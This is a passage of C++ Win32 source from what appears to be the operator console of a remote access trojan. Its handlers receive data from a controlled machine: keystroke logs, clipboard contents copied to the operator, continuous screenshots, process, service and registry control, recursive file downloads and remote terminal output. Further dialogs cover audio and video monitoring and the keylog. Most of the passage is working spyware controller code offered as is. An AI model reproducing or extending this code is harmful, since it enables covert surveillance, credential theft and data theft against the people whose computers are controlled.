                            ListView_SetItemText(hList, idx, 6, (LPWSTR)wPath.c_str());
                        }
                        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
                        AddLog(L"系统", L"进程列表已更新: " + wIP);
                    }
                } else if (pkg->cmd == CMD_PROCESS_MODULES) {
                    if (client->hModuleDlg && IsWindow(client->hModuleDlg)) {
                        HWND hList = GetDlgItem(client->hModuleDlg, IDC_LIST_MODULES);
                        ListView_DeleteAllItems(hList);

                        int count = pkg->arg1 / sizeof(ModuleInfo);
                        ModuleInfo* pInfo = (ModuleInfo*)pkg->data;

                        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
                        for (int i = 0; i < count; i++) {
                            std::wstring wModName = ToWString(pInfo[i].name);
                            LVITEMW lvi = { 0 };
                            lvi.mask = LVIF_TEXT;
                            lvi.iItem = i;
                            lvi.pszText = (LPWSTR)wModName.c_str();

                            int idx = ListView_InsertItem(hList, &lvi);

                            wchar_t szBase[32];
                            swprintf_s(szBase, L"0x%016llX", pInfo[i].baseAddr);
                            std::wstring wSize = ToWString((int)pInfo[i].size);
                            std::wstring wPath = ToWString(pInfo[i].path);

                            ListView_SetItemText(hList, idx, 1, szBase);
                            ListView_SetItemText(hList, idx, 2, (LPWSTR)wSize.c_str());
                            ListView_SetItemText(hList, idx, 3, (LPWSTR)wPath.c_str());
                        }
                        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
                        AddLog(L"系统", L"模块列表已更新: " + wIP);
                    }
                } else if (pkg->cmd == CMD_PROCESS_KILL) {
                    std::string msg(pkg->data, pkg->arg1);
                    MessageBoxW(client->hProcessDlg, ToWString(msg).c_str(), L"结束进程", MB_OK | MB_ICONINFORMATION);
                    CommandPkg refreshPkg = { 0 };
                    refreshPkg.cmd = CMD_PROCESS_LIST;
                    
                    size_t bodySize = sizeof(CommandPkg);
                    std::vector<char> sendBuf(sizeof(PkgHeader) + bodySize);
                    PkgHeader* h = (PkgHeader*)sendBuf.data();
                    memcpy(h->flag, "FRMD26?", 7);
                    h->originLen = (int)bodySize;
                    h->totalLen = (int)sendBuf.size();
                    memcpy(sendBuf.data() + sizeof(PkgHeader), &refreshPkg, bodySize);
                    
                    std::lock_guard<std::mutex> lock(client->sendMutex);
                    send(client->socket, sendBuf.data(), (int)sendBuf.size(), 0);
                } else if (pkg->cmd == CMD_WINDOW_LIST) {
                    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
                        HWND hList = GetDlgItem(client->hWindowDlg, IDC_LIST_WINDOW);
                        ListView_DeleteAllItems(hList);
                        
                        std::string data(pkg->data, pkg->arg1);
                        std::stringstream ss(data);
                        std::string line;
                        int i = 0;
                        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
                        while (std::getline(ss, line)) {
                            if (line.empty()) continue;
                            size_t p1 = line.find('|');
                            size_t p2 = line.find('|', p1 + 1);
                            if (p1 != std::string::npos && p2 != std::string::npos) {
                                std::string sHwnd = line.substr(0, p1);
                                std::string sClass = line.substr(p1 + 1, p2 - p1 - 1);
                                std::string sTitle = line.substr(p2 + 1);
                                
                                uint64_t hwnd = std::stoull(sHwnd);
                                
                                std::wstring wTitle = ToWString(sTitle);
                                std::wstring wClass = ToWString(sClass);
                                std::wstring wHwnd = ToWString(sHwnd);

                                LVITEMW lvi = { 0 };
                                lvi.mask = LVIF_TEXT | LVIF_PARAM;
                                lvi.iItem = i++;
                                lvi.pszText = (LPWSTR)wTitle.c_str();
                                lvi.lParam = (LPARAM)hwnd;
                                
                                int idx = ListView_InsertItem(hList, &lvi);
                                ListView_SetItemText(hList, idx, 1, (LPWSTR)wClass.c_str());
                                ListView_SetItemText(hList, idx, 2, (LPWSTR)wHwnd.c_str());
                            }
                        }
                        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
                        AddLog(L"系统", L"窗口列表已更新: " + wIP);
                    }
                } else if (pkg->cmd == CMD_CLIPBOARD_GET) {
                    // 收到被控端发回的剪贴板文本
                    std::string text(pkg->data, pkg->arg1);
                    std::wstring wText = UTF8ToWide(text);
                    if (OpenClipboard(g_hMainWnd)) {
                        EmptyClipboard();
                        size_t size = (wText.size() + 1) * sizeof(wchar_t);
                        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
                        if (hGlobal) {
                            void* p = GlobalLock(hGlobal);
                            memcpy(p, wText.c_str(), size);
                            GlobalUnlock(hGlobal);
                            SetClipboardData(CF_UNICODETEXT, hGlobal);
                        }
                        CloseClipboard();
                        AddLog(L"剪贴板", L"已获取被控端剪贴板数据并同步到本地");
                    }
                } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
                    if (client->hDesktopDlg && IsWindow(client->hDesktopDlg)) {
                        std::lock_guard<std::mutex> lock(client->screenMutex);
                        
                        // pkg->data is a BMP file (BITMAPFILEHEADER + BITMAPINFOHEADER + bits)
                        if (pkg->arg1 >= sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)) {
                            BITMAPFILEHEADER* bfh = (BITMAPFILEHEADER*)pkg->data;
                            if (bfh->bfType == 0x4D42) {
                                BITMAPINFOHEADER* bih = (BITMAPINFOHEADER*)(pkg->data + sizeof(BITMAPFILEHEADER));
                                void* bits = pkg->data + bfh->bfOffBits;

                                if (client->hScreen) DeleteObject(client->hScreen);
                                
                                HDC hdc = GetDC(NULL);
                                client->hScreen = CreateDIBitmap(hdc, bih, CBM_INIT, bits, (BITMAPINFO*)bih, DIB_RGB_COLORS);
                                ReleaseDC(NULL, hdc);

                                // Invalidate the desktop dialog to trigger repaint
                                InvalidateRect(client->hDesktopDlg, NULL, FALSE);
                                
                                // If still monitoring, request next frame
                                if (client->isMonitoring) {
                                    CommandPkg nextPkg = { 0 };
                                    nextPkg.cmd = CMD_SCREEN_CAPTURE;
                                    nextPkg.arg1 = 1;
                                    size_t bodySize = sizeof(CommandPkg);
                                    std::vector<char> sendBuf(sizeof(PkgHeader) + bodySize);
                                    PkgHeader* h = (PkgHeader*)sendBuf.data();
                                    memcpy(h->flag, "FRMD26?", 7);
                                    h->originLen = (int)bodySize;
                                    h->totalLen = (int)sendBuf.size();
                                    memcpy(sendBuf.data() + sizeof(PkgHeader), &nextPkg, bodySize);
                                    
                                    std::lock_guard<std::mutex> lockSend(client->sendMutex);
                                    send(client->socket, sendBuf.data(), (int)sendBuf.size(), 0);
                                }
                            }
                        }
                    }
                } else if (pkg->cmd == CMD_SERVICE_LIST) {
                    if (client->hServiceDlg && IsWindow(client->hServiceDlg)) {
                        HWND hList = GetDlgItem(client->hServiceDlg, IDC_LIST_SERVICE);
                        std::string data(pkg->data, pkg->arg1);
                        if (data == "OK" || data == "FAIL") {
                            CommandPkg refreshPkg = { 0 };
                            refreshPkg.cmd = CMD_SERVICE_LIST;
                            refreshPkg.arg1 = 0;
                            size_t bodySize = sizeof(CommandPkg);
                            std::vector<char> sendBuf(sizeof(PkgHeader) + bodySize);
                            PkgHeader* h = (PkgHeader*)sendBuf.data();
                            memcpy(h->flag, "FRMD26?", 7);
                            h->originLen = (int)bodySize;
                            h->totalLen = (int)sendBuf.size();
                            memcpy(sendBuf.data() + sizeof(PkgHeader), &refreshPkg, bodySize);
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, sendBuf.data(), (int)sendBuf.size(), 0);
                        } else {
                            ListView_DeleteAllItems(hList);
                            std::stringstream ss(data);
                            std::string line;
                            int i = 0;
                            SendMessage(hList, WM_SETREDRAW, FALSE, 0);
                            while (std::getline(ss, line)) {
                                if (line.empty()) continue;
                                size_t p1 = line.find('|');
                                size_t p2 = line.find('|', p1 + 1);
                                size_t p3 = line.find('|', p2 + 1);
                                size_t p4 = line.find('|', p3 + 1);

                                if (p1 != std::string::npos && p2 != std::string::npos) {
                                    std::string sName = line.substr(0, p1);
                                    std::string sDisp = line.substr(p1 + 1, p2 - p1 - 1);
                                    std::string sStat = line.substr(p2 + 1, p3 - p2 - 1); // Status is now string
                                    
                                    // Handle optional new fields if present
                                    std::string sStartType = "未知";
                                    std::string sBinaryPath = "";
                                    
                                    if (p3 != std::string::npos) {
                                        sStartType = line.substr(p3 + 1, p4 - p3 - 1);
                                        if (p4 != std::string::npos) {
                                            sBinaryPath = line.substr(p4 + 1);
                                        }
                                    } else {
                                        // Fallback for old format if mixed
                                         sStat = line.substr(p2 + 1);
                                    }
                                    
                                    std::wstring wName = ToWString(sName);
                                    std::wstring wDisp = ToWString(sDisp);
                                    std::wstring wSStartType = ToWString(sStartType);
                                    std::wstring wSBinaryPath = ToWString(sBinaryPath);

                                    LVITEMW lvi = { 0 };
                                    lvi.mask = LVIF_TEXT;
                                    lvi.iItem = i++;
                                    lvi.pszText = (LPWSTR)wName.c_str();
                                    
                                    int idx = ListView_InsertItem(hList, &lvi);
                                    ListView_SetItemText(hList, idx, 1, (LPWSTR)wDisp.c_str());
                                    
                                    // Status is now sent as string from client
                                    // If old client sends int, we might need to check. 
                                    // But we updated client code to send string.
                                    // If sStat contains digits only, parse it? 
                                    // Let's assume new client.
                                    
                                    // Actually, let's just use what we received, as we changed client to send readable string.
                                    // But wait, if sStat is digit string (old client), ToWString will just show "1".
                                    // We can try to detect if it's numeric.
                                    
                                    bool isNumeric = !sStat.empty() && std::all_of(sStat.begin(), sStat.end(), ::isdigit);
                                    std::wstring wStatus;
                                    
                                    if (isNumeric) {
                                        int status = std::stoi(sStat);
                                        switch (status) {
                                            case 1: wStatus = L"已停止"; break; // SERVICE_STOPPED
                                            case 2: wStatus = L"正在启动"; break; // SERVICE_START_PENDING
                                            case 3: wStatus = L"正在停止"; break; // SERVICE_STOP_PENDING
                                            case 4: wStatus = L"正在运行"; break; // SERVICE_RUNNING
                                            case 5: wStatus = L"正在继续"; break; // SERVICE_CONTINUE_PENDING
                                            case 6: wStatus = L"正在暂停"; break; // SERVICE_PAUSE_PENDING
                                            case 7: wStatus = L"已暂停"; break; // SERVICE_PAUSED
                                            default: wStatus = ToWString(status);
                                        }
                                    } else {
                                        wStatus = ToWString(sStat);
                                    }
                                    
                                    ListView_SetItemText(hList, idx, 2, (LPWSTR)wStatus.c_str());
                                    ListView_SetItemText(hList, idx, 3, (LPWSTR)wSStartType.c_str());
                                    ListView_SetItemText(hList, idx, 4, (LPWSTR)wSBinaryPath.c_str());
                                }
                            }
                            SendMessage(hList, WM_SETREDRAW, TRUE, 0);
                        }
                        AddLog(L"系统", L"服务列表已更新: " + wIP);
                    }
                } else if (pkg->cmd == CMD_REGISTRY_CTRL) {
                    if (client->hRegistryDlg && IsWindow(client->hRegistryDlg)) {
                        std::string data(pkg->data, pkg->arg1);
                        if (data == "OK_KEY" || data == "OK_VAL" || data == "FAIL") {
                            if (data == "OK_KEY") {
                                AddLog(L"注册表", L"注册表项删除成功: " + wIP);
                                HWND hTree = GetDlgItem(client->hRegistryDlg, IDC_TREE_REGISTRY);
                                HTREEITEM hSelected = TreeView_GetSelection(hTree);
                                if (hSelected) {
                                    HTREEITEM hParent = TreeView_GetParent(hTree, hSelected);
                                    TreeView_DeleteItem(hTree, hSelected);
                                    if (hParent) TreeView_SelectItem(hTree, hParent);
                                }
                            } else if (data == "OK_VAL") {
                                AddLog(L"注册表", L"注册表数值删除成功: " + wIP);
                                HWND hTree = GetDlgItem(client->hRegistryDlg, IDC_TREE_REGISTRY);
                                HTREEITEM hSelected = TreeView_GetSelection(hTree);
                                if (hSelected) {
                                    NM_TREEVIEWW nmtv = { 0 };
                                    nmtv.hdr.hwndFrom = hTree;
                                    nmtv.hdr.idFrom = IDC_TREE_REGISTRY;
                                    nmtv.hdr.code = TVN_SELCHANGEDW;
                                    nmtv.itemNew.hItem = hSelected;
                                    SendMessage(client->hRegistryDlg, WM_NOTIFY, IDC_TREE_REGISTRY, (LPARAM)&nmtv);
                                }
                            } else {
                                MessageBoxW(client->hRegistryDlg, L"操作失败：无法删除注册表项或数值。", L"错误", MB_OK | MB_ICONERROR);
                            }
                            continue;
                        }

                        HWND hTree = GetDlgItem(client->hRegistryDlg, IDC_TREE_REGISTRY);
                        HTREEITEM hSelected = TreeView_GetSelection(hTree);
                        if (hSelected) {
                            std::stringstream ss(data);
                            std::string line;
                            SendMessage(hTree, WM_SETREDRAW, FALSE, 0);
                            TVITEMW tvi = { 0 };
                            tvi.mask = TVIF_PARAM;
                            tvi.hItem = hSelected;
                            TreeView_GetItem(hTree, &tvi);
                            uint32_t rootIdx = (uint32_t)tvi.lParam;
                            HTREEITEM hChild = TreeView_GetChild(hTree, hSelected);
                            while (hChild) {
                                HTREEITEM hNext = TreeView_GetNextSibling(hTree, hChild);
                                TreeView_DeleteItem(hTree, hChild);
                                hChild = hNext;
                            }

                            HWND hValues = GetDlgItem(client->hRegistryDlg, IDC_LIST_REGISTRY_VALUES);
                            SendMessage(hValues, WM_SETREDRAW, FALSE, 0);
                            ListView_DeleteAllItems(hValues);
                            
                            while (std::getline(ss, line)) {
                                if (line.empty()) continue;
                                if (line.substr(0, 2) == "K|") {
                                    std::string name = line.substr(2);
                                    std::wstring wName = ToWString(name);
                                    TVINSERTSTRUCTW tvis = { 0 };
                                    tvis.hParent = hSelected;
                                    tvis.hInsertAfter = TVI_LAST;
                                    tvis.item.mask = TVIF_TEXT | TVIF_PARAM | TVIF_CHILDREN | TVIF_IMAGE | TVIF_SELECTEDIMAGE;
                                    tvis.item.pszText = (LPWSTR)wName.c_str();
                                    tvis.item.lParam = rootIdx;
                                    tvis.item.cChildren = 1; // Assume it has children for lazy loading
                                    tvis.item.iImage = 1; // Folder icon
                                    tvis.item.iSelectedImage = 1;
                                    TreeView_InsertItem(hTree, &tvis);
                                } else if (line.substr(0, 2) == "V|") {
                                    // V|Name|Type|Data
                                    size_t p1 = line.find('|', 2);
                                    size_t p2 = line.find('|', p1 + 1);
                                    std::string name = line.substr(2, p1 - 2);
                                    std::string type = line.substr(p1 + 1, p2 - p1 - 1);
                                    std::string dataStr = (p2 != std::string::npos) ? line.substr(p2 + 1) : "";

                                    std::wstring wName = name.empty() ? L"(默认)" : ToWString(name);
                                    std::wstring wData = ToWString(dataStr);

                                    LVITEMW lvi = { 0 };
                                    lvi.mask = LVIF_TEXT;
                                    lvi.iItem = ListView_GetItemCount(hValues);
                                    lvi.pszText = (LPWSTR)wName.c_str();
                                    int idx = ListView_InsertItem(hValues, &lvi);
                                    
                                    // Map type ID to string
                                    DWORD dwType = 0;
                                    try { dwType = (DWORD)std::stoul(type); } catch (...) {}
                                    const wchar_t* typeNames[] = { L"REG_NONE", L"REG_SZ", L"REG_EXPAND_SZ", L"REG_BINARY", L"REG_DWORD", L"REG_DWORD_BIG_ENDIAN", L"REG_LINK", L"REG_MULTI_SZ", L"REG_RESOURCE_LIST" };
                                    const wchar_t* typeName = (dwType < 9) ? typeNames[dwType] : L"REG_UNKNOWN";
                                    
                                    ListView_SetItemText(hValues, idx, 1, (LPWSTR)typeName);
                                    ListView_SetItemText(hValues, idx, 2, (LPWSTR)wData.c_str());
                                }
                            }
                            TreeView_Expand(hTree, hSelected, TVE_EXPAND);
                            SendMessage(hTree, WM_SETREDRAW, TRUE, 0);
                            SendMessage(hValues, WM_SETREDRAW, TRUE, 0);
                        }
                    }
                } else if (pkg->cmd == CMD_FILE_LIST) {
                    if (client->hFileDlg && IsWindow(client->hFileDlg)) {
                        HWND hList = GetDlgItem(client->hFileDlg, IDC_LIST_FILE_REMOTE);
                        ListView_DeleteAllItems(hList);
                        
                        std::string data(pkg->data, pkg->arg1);
                        std::stringstream ss(data);
                        std::string line;
                        int i = 0;
                        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
                        
                        // Add ".." if not root
                        wchar_t currentPath[MAX_PATH];
                        GetDlgItemTextW(client->hFileDlg, IDC_EDIT_FILE_PATH_REMOTE, currentPath, MAX_PATH);
                        if (wcslen(currentPath) > 3) {
                            LVITEMW lvi = { 0 };
                            lvi.mask = LVIF_TEXT | LVIF_PARAM | LVIF_IMAGE;
                            lvi.iItem = i++;
                            lvi.pszText = (LPWSTR)L"..";
                            lvi.lParam = 1; // Dir
                            lvi.iImage = 1; // Folder icon
                            ListView_InsertItem(hList, &lvi);
                        }

                        while (std::getline(ss, line)) {
                            if (line.empty()) continue;
                            // Format: [DIR]|Name|Size|Time
                            size_t p1 = line.find('|');
                            size_t p2 = line.find('|', p1 + 1);
                            size_t p3 = line.find('|', p2 + 1);
                            
                            if (p1 != std::string::npos) {
                                std::string type = line.substr(0, p1);
                                std::string name = line.substr(p1 + 1, p2 - p1 - 1);
                                std::string size = line.substr(p2 + 1, p3 - p2 - 1);
                                std::string time = line.substr(p3 + 1);
                                
                                bool isDir = (type == "[DIR]");
                                
                                std::wstring wName = ToWString(name);
                                std::wstring wSize = ToWString(size);
                                std::wstring wTime = ToWString(time);

                                LVITEMW lvi = { 0 };
                                lvi.mask = LVIF_TEXT | LVIF_PARAM | LVIF_IMAGE;
                                lvi.iItem = i++;
                                lvi.pszText = (LPWSTR)wName.c_str();
                                lvi.lParam = isDir ? 1 : 0;
                                lvi.iImage = isDir ? 1 : 2; // Folder or File icon
                                
                                int idx = ListView_InsertItem(hList, &lvi);

                                ListView_SetItemText(hList, idx, 1, (LPWSTR)wSize.c_str());
                                ListView_SetItemText(hList, idx, 2, (LPWSTR)wTime.c_str());
                            }
                        }
                        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
                    }
                } else if (pkg->cmd == CMD_FILE_DOWNLOAD_DIR) {
                    std::string data(pkg->data, pkg->arg1);
                    size_t p = data.find('|');
                    if (p != std::string::npos) {
                        std::string type = data.substr(0, p);
                        std::string remotePath = data.substr(p + 1);
                        std::wstring wRemotePath = ToWString(remotePath);

                        // 计算相对于远程基目录的路径
                        std::wstring relativePath;
                        if (wRemotePath.size() >= client->downloadRemoteBase.size()) {
                            relativePath = wRemotePath.substr(client->downloadRemoteBase.size());
                            if (!relativePath.empty() && (relativePath[0] == L'\\' || relativePath[0] == L'/')) {
                                relativePath = relativePath.substr(1);
                            }
                        }

                        std::wstring localPath = client->downloadLocalBase + L"\\" + relativePath;

                        if (type == "MKDIR") {
                            SHCreateDirectoryExW(NULL, localPath.c_str(), NULL);
                        } else if (type == "FILE") {
                            if (client->downloadFile.is_open()) client->downloadFile.close();
                            client->downloadPath = localPath;
                            client->downloadFile.open(localPath, std::ios::binary);
                            if (!client->downloadFile.is_open()) {
                                AddLog(L"错误", L"无法创建本地文件: " + localPath);
                            }
                        }
                    }
                } else if (pkg->cmd == CMD_FILE_DOWNLOAD) {
                    std::string data(pkg->data, pkg->arg1);
                    if (data == "FINISH") {
                        if (client->downloadFile.is_open()) {
                            client->downloadFile.close();
                            AddLog(L"文件", L"文件下载完成: " + client->downloadPath);
                            // Refresh local list
                            PostMessage(client->hFileDlg, WM_COMMAND, IDC_BTN_FILE_GO_LOCAL, 0);
                        }
                    } else if (data.find("Cannot open") != std::string::npos) {
                        AddLog(L"错误", L"文件下载失败: " + ToWString(data));
                    }
                } else if (pkg->cmd == CMD_FILE_DATA) {
                    if (client->downloadFile.is_open()) {
                        client->downloadFile.write(pkg->data, pkg->arg1);
                    }
                } else if (pkg->cmd == CMD_KEYLOG) {
                    std::string data(pkg->data, pkg->arg1);
                    if (!data.empty()) {
                        if (client->hKeylogDlg && IsWindow(client->hKeylogDlg)) {
                            HWND hEdit = GetDlgItem(client->hKeylogDlg, IDC_EDIT_KEYLOG);
                            int len = GetWindowTextLengthW(hEdit);
                            SendMessageW(hEdit, EM_SETSEL, len, len);
                            SendMessageW(hEdit, EM_REPLACESEL, 0, (LPARAM)ToWString(data).c_str());
                        } else {
                            AddLog(L"键盘记录", ToWString(data));
                        }
                    }
                } else if (pkg->cmd == CMD_TERMINAL_OPEN || pkg->cmd == CMD_TERMINAL_DATA) {
                    if (client->hTerminalDlg && IsWindow(client->hTerminalDlg)) {
                        std::string data(pkg->data, pkg->arg1);
                        std::wstring wData = ToWString(data);
                        
                        HWND hEdit = GetDlgItem(client->hTerminalDlg, IDC_EDIT_TERM_OUT);
                        int len = GetWindowTextLengthW(hEdit);
                        SendMessageW(hEdit, EM_SETSEL, len, len);
                        SendMessageW(hEdit, EM_REPLACESEL, 0, (LPARAM)wData.c_str());
                    }
                } else if (pkg->cmd == CMD_GET_SYSINFO) {
                    std::string info(pkg->data, pkg->arg1);
                    std::wstring wInfo = ToWString(info);
                    MessageBoxW(g_hMainWnd, wInfo.c_str(), L"系统信息", MB_OK | MB_ICONINFORMATION);
                    AddLog(L"系统", L"已获取系统信息: " + wIP);
                } else {
                    // 处理其他模块的通用响应数据
                    std::string response(buffer.data(), buffer.size());
                    std::wstring wResponse = ToWString(response);
                    AddLog(L"模块响应", L"收到来自 [" + wIP + L"] 的模块数据: " + wResponse.substr(0, 100) + (wResponse.size() > 100 ? L"..." : L""));
                }
            }
        }
    }
    AddLog(L"离线通知", wIP + L" 已离线");
    
    LVFINDINFOW fi = { 0 };
    fi.flags = LVFI_PARAM;
    fi.lParam = (LPARAM)id;
    int index = ListView_FindItem(g_hListClients, -1, &fi);
    if (index != -1) {
        ListView_DeleteItem(g_hListClients, index);
    }
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        g_Clients.erase(id);
    }
    UpdateStatusBar();
    closesocket(client->socket);
}

INT_PTR CALLBACK AudioDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        // 调整语音监控提示文本的位置，使其居中
        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC);
        if (hStatic) {
            MoveWindow(hStatic, 10, 10, rc.right - 20, rc.bottom - 20, TRUE);
        }
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK VideoDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        // 视频窗口通常需要缩放显示区域
        // 如果有用于显示视频的 static 控件，调整其大小
        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC);
        if (hStatic) {
            MoveWindow(hStatic, 0, 0, rc.right, rc.bottom, TRUE);
        }
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK KeylogDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_KEYLOG), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
